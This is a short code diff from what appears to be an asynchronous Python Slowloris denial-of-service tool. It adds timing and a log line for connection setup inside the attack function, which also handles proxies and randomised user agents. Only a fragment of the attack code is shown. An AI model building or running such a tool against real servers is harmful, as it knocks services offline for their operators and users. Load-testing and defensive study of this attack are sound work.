@@ -170,7 +170,13 @@ async def slowloris_attack_loop(*args, **kwargs):
                 print(f'{e.__class__.__name__}')
 
 async def slowloris_attack(host, port, read_rate, write_rate, https, path, headers_list, proxies, interval, request_method, data_list, headers_n_list):
+
+    time_conn_start = time.time()
+
     reader, writer = await slowloris_open(host, port, https, proxies)
+
+    print(f'Connection established in {time.time()-time_conn_start} seconds')
+
     headers = DEFAULT_HEADERS
     headers['Host'] = host
     headers['User-Agent'] = random.choice(USER_AGENTS)
